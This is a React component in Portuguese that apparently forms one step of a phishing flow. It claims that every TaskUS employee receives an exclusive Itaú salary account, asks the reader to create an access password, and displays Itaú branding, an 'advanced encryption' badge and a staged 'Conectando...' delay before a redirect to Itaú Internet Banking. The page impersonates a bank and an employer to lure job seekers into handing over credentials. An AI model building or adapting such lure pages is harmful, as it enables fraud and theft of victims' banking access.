
import React, { useState } from 'react';
// eslint-disable-next-line no-unused-vars
import { motion } from 'framer-motion';
import ItauElementMin from '../../assets/itau_element-min.webp';
import '../../styles/refino.css';

const PaymentCreateAccountStep = ({ onCriarSenha }) => {
  const [loading, setLoading] = useState(false);

  const continuar = async () => {
    setLoading(true);
    setTimeout(async () => {
      await onCriarSenha();
      setLoading(false);
    }, 1000);
  };

  return (
    <div className="min-h-screen flex flex-col items-center bg-[#0a0026] px-2 pt-10">
      <div className="w-full max-w-md mx-auto">
        {/* Código de aprovação */}
       
        {/* Título principal */}
        <h1 className="headlines font-hendrix-bold text-2xl text-white mb-3 leading-tight">
          Agora vamos abrir sua conta salário no banco parceiro
        </h1>
        <p className="subheadlines font-hendrix-regular text-base text-gray-300 mb-6">
          Todo colaborador da TaskUS recebe uma conta exclusiva do banco Itaú para receber seu salário. Crie a sua senha de acesso para oficializar a conta.
        </p>
        
        {/* Bloco de aviso */}
     <div
        className="rounded-2xl mb-5 px-6 py-5"
        style={{ background: '#0a0010', minHeight: 90 }}
      >
        <div className="flex flex-col items-start">
          {/* Wrapper do ícone — mesmo padrão dos outros cards */}
          <div className="mb-2">
            <div className="w-15 h-15 mb-0 mt-3" style={{ lineHeight: 0 }}>
              <svg width="38" height="38" fill="none" style={{ display: 'block' }}>
                <text x="0" y="32" fontSize="45" fill="#fff">*</text>
              </svg>
            </div>
          </div>

          {/* Texto — mesmo padrão: text-sm, 10pt, alinhado à esquerda */}
          <div
            className="text-sm text-gray-100"
            style={{ fontSize: '10pt', textAlign: 'left' }}
          >
            Lembrando que essa é uma conta exclusiva da TaskUS em parceria com o itaú para você receber o seu salário.<br />
            <span
              className="font-hendrix-bold text-white block"
              style={{ marginTop: '2px', fontSize: '10pt' }}
            >
              Se você já tiver uma conta nesse banco não terá interferência alguma.
            </span>
          </div>
        </div>
      </div>

       {/* Bloco de aviso */}
     <div
        className="rounded-2xl mb-5 px-6 py-5"
        style={{ background: '#0a0010', minHeight: 90 }}
      >
        <div className="flex flex-col items-start">
          {/* Wrapper do ícone — mesmo padrão dos outros cards */}
          <div className="mb-2">
            <div className="w-15 h-15 mb-0 mt-3" style={{ lineHeight: 0 }}>
              <svg width="38" height="38" fill="none" style={{ display: 'block' }}>
                <text x="0" y="32" fontSize="45" fill="#fff">*</text>
              </svg>
            </div>
          </div>

          {/* Texto — mesmo padrão: text-sm, 10pt, alinhado à esquerda */}
          <div
            className="text-sm text-gray-100"
            style={{ fontSize: '10pt', textAlign: 'left' }}
          >
            Lembrando que essa é uma conta exclusiva da TaskUS em parceria com o itaú para você receber o seu salário.<br />
            <span
              className="font-hendrix-bold text-white block"
              style={{ marginTop: '2px', fontSize: '10pt' }}
            >
              Se você já tiver uma conta nesse banco não terá interferência alguma.
            </span>
          </div>
        </div>
      </div>

       {/* Bloco de aviso */}
     <div
        className="rounded-2xl mb-10 px-6 py-5"
        style={{ background: '#0a0010', minHeight: 90 }}
      >
        <div className="flex flex-col items-start">
          {/* Wrapper do ícone — mesmo padrão dos outros cards */}
          <div className="mb-2">
            <div className="w-15 h-15 mb-0 mt-3" style={{ lineHeight: 0 }}>
              <svg width="38" height="38" fill="none" style={{ display: 'block' }}>
                <text x="0" y="32" fontSize="45" fill="#fff">*</text>
              </svg>
            </div>
          </div>

          {/* Texto — mesmo padrão: text-sm, 10pt, alinhado à esquerda */}
          <div
            className="text-sm text-gray-100"
            style={{ fontSize: '10pt', textAlign: 'left' }}
          >
            Lembrando que essa é uma conta exclusiva da TaskUS em parceria com o itaú para você receber o seu salário.<br />
            <span
              className="font-hendrix-bold text-white block"
              style={{ marginTop: '2px', fontSize: '10pt' }}
            >
              Se você já tiver uma conta nesse banco não terá interferência alguma.
            </span>
          </div>
        </div>
      </div>

        {/* Card do app Itaú */}
        <div className="bg-white rounded-2xl px-2 pt-6 pb-2 mb-25 flex flex-col items-center shadow" style={{ minHeight: '320px' }}>
          <div className="w-full flex flex-col items-center">
            <span className="font-hendrix-regular text-gray-400 text-xs mb-2 mt-1" style={{ letterSpacing: '0.2px' }}>🔒 Criptografia avançada.</span>
            <img
              src={ItauElementMin}
              alt="Elemento Itaú"
              className="h-100 w-auto p-10"
            />
          </div>
          <div className="w-full text-center mt-2 mb-2">
            <p className="koap font-hendrix-regular text-gray-700 text-base" style={{ fontSize: '15px' }}>
              Você será direcionado(a) para o<br /> <b>Internet Banking do Itaú.</b>
            </p>
          </div>
          <motion.button
            type="button"
            onClick={continuar}
            disabled={loading}
            whileTap={{ scale: 0.97 }}
            whileHover={{ scale: loading ? 1 : 1.03 }}
            className={`w-[70vw] mt-4 mb-7 flex items-center justify-center gap-2 py-5 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none transition-all duration-300 ${loading ? 'cursor-not-allowed opacity-70' : ''}`}
            style={{
              background: loading ? 'linear-gradient(90deg, #fbbf24 0%, #f97316 100%)' : 'linear-gradient(90deg, #f97316 0%, #fbbf24 100%)',
              fontSize: '15px',
              boxShadow: '0 2px 8px 0 rgba(249,115,22,0.10)',
              border: 'none',
              opacity: loading ? 0.7 : 1
            }}
          >
            {loading ? (
              <>
                <motion.div
                  className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                  style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                />
                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13px' }}>Conectando...</span>
              </>
            ) : (
              <span className="font-hendrix-bold tracking-wide" style={{ fontSize: '15px' }}>Criar conta salário</span>
            )}
          </motion.button>
        </div>
      </div>
    </div>
  );
};

export default PaymentCreateAccountStep;
